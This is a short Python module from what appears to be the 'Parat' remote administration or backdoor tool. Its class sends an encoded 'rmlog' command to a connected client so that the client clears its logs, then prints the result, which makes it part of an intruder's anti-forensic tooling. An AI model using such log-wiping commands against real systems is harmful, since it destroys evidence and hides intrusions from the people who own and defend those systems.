#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from time import sleep
from lib.ParatPrint import colorize, pprint, gray
from lib.ProcessThread import ParatProcessBar
from lib.ParatEncrypt import Encode, Decode


class ParatLogC:

    def __init__(self, conn, colors):

        self.handler = "#DATA_HANDLER"
        self.conn    = conn
        self.colors  = colors


    def start(self):

        self.conn.send(Encode("rmlog"))

        text = colorize(
            "cleaning logs",
            colored=self.colors,
            status="INF"
        )
        process_bar = ParatProcessBar(text)
        process_bar.start_process()

        result = Decode(self.conn.recv(4096))
        process_bar.Stop = True
        sleep(0.2)

        pprint(result) if self.colors else pprint(gray(result))
